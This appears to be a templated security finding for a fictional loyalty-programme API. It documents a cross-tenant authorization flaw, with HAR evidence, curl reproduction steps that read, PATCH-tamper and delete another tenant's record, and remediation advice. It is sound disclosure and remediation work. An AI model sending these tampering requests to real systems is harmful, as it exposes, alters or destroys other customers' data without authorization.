## System

- System: RewardCore Loyalty API v3.9.0
- Domain: RETAIL / LOYALTY PROGRAMME
- Example ID: BOLA-0073
- Risk ID: RISK-24-073

## Findings

### 1. Pattern 2.4 — Privilege Escalation via Parameter Tampering on `/api/v2/entitys/:id` (HAR Primary)

**HAR evidence**: JWT `X-Tenant-ID: ORG-F2E9`. Request: `GET /api/v2/entitys/ENT-2073`. Response: HTTP 200 OK with `"tenantId": "ORG-7CAD"`, `"sensitiveData": "CONFIDENTIAL: cross-tenant data for ORG-7CAD"`.

**Pattern 2.4 (BAC — Privilege Escalation via Parameter Tampering)**: the authenticated user tampers with the `entity_id` URL path parameter to access loyalty account records beyond their authorized privilege level. Section 4.0 confirms: the backend queries by `entity_id` only, without filtering by `owner_id` or `tenant_id`. Section 3.0 (database schema comment): "Application code does NOT use tenant_id in authorization checks."

**Retail/Loyalty impact**: `entity_id` objects represent loyalty accounts or reward records. Cross-tenant read exposes another retailer's customer points balances and `sensitive_data` (redemption history, tier status). The PATCH/DELETE endpoints share the same unguarded handler — privilege escalation extends to write operations.

### 2. Write Privilege Escalation via PATCH/DELETE (Pattern 2.4 Extension)

Section 4.0: "The GET/PATCH/DELETE `/api/v2/entitys/:id` endpoint accepts a `entity_id` in the URL path." The same `entity_id` parameter tampering that enables unauthorized reads also enables unauthorized writes (PATCH) and deletes (DELETE) — escalating the privilege from read-only to full control over another retailer's loyalty records.

## Evidence

- **HAR**: `GET /api/v2/entitys/ENT-2073` with `ORG-F2E9` JWT → HTTP 200 → `tenantId: ORG-7CAD` with `sensitiveData`.
- **Section 4.0**: Pattern 2.4 — GET/PATCH/DELETE endpoints lack tenant/owner filter.
- **Section 3.0**: Database schema comment confirms no `tenant_id` authorization check in application code.
- **Section 6.0 (RISK-24-073)**: documented risk, remediation blocked pending DB migration.

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s "https://api.rewardcore-loya.example.com/api/v2/entitys/ENT-1073" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-F2E9>" \
  -H "X-Tenant-ID: ORG-F2E9"
```

Expected: `tenantId: "ORG-F2E9"`.

**Step 2 — Parameter tampering: read cross-tenant loyalty record (primary HAR attack):**

```bash
curl -s "https://api.rewardcore-loya.example.com/api/v2/entitys/ENT-2073" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-F2E9>" \
  -H "X-Tenant-ID: ORG-F2E9"
```

Expected secure: HTTP 403 or 404.  
Expected vulnerable: HTTP 200 with `tenantId: "ORG-7CAD"` and `sensitiveData`.

**Step 3 — Write privilege escalation via PATCH (Pattern 2.4 write extension):**

```bash
curl -s -X PATCH "https://api.rewardcore-loya.example.com/api/v2/entitys/ENT-2073" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-F2E9>" \
  -H "X-Tenant-ID: ORG-F2E9" \
  -H "Content-Type: application/json" \
  -d '{"status": "suspended", "sensitive_data": "tampered_by_attacker"}'
```

Expected secure: HTTP 403.  
Expected vulnerable: HTTP 200 — loyalty record for `ORG-7CAD` customer modified.

**Step 4 — Delete privilege escalation:**

```bash
curl -s -X DELETE "https://api.rewardcore-loya.example.com/api/v2/entitys/ENT-2073" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-F2E9>" \
  -H "X-Tenant-ID: ORG-F2E9"
```

## Remediation

- **Add `WHERE tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub`** to all queries in GET/PATCH/DELETE handlers (RISK-24-073).
- **Enforce ownership before any write/delete**: resolve DB migration ticket #DB-173 blocking the fix.
- **Centralise authorization middleware**: ID resolution must always be paired with ownership check.
- **Add regression test**: Tenant A token requests Tenant B `entity_id` via GET, PATCH, DELETE — assert HTTP 403/404.
